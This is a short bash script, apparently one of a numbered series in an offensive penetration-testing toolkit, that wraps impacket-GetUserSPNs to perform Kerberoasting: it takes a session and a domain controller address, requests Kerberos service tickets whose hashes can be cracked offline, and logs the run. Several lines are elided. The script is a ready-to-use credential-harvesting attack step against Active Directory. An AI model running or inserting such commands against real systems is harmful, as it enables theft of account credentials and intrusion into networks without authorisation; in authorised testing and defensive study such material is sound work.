#!/usr/bin/env bash
# V-094.sh — Kerberoasting
# Category: Host, Software and internal architecture
# Tool: impacket-GetUserSPNs
# Usage: bash V-094.sh <SESSION> <TARGET>
# Place at: ~/Desktop/trinetra/scripts/hexstrike/V-094.sh
set -euo pipefail

SESSION="${1:?ERROR: usage: bash V-094.sh <session> <target>}"
TARGET="${2:?ERROR: usage: bash V-094.sh <session> <target>}"
...
CMD="impacket-GetUserSPNs -request -dc-ip $TARGET domain/user"

echo "[hex] V-094: Kerberoasting → $TARGET"
...
python3 - \
    ...
    "V-094" "Kerberoasting" "Host, Software and internal architecture" "impacket-GetUserSPNs" \
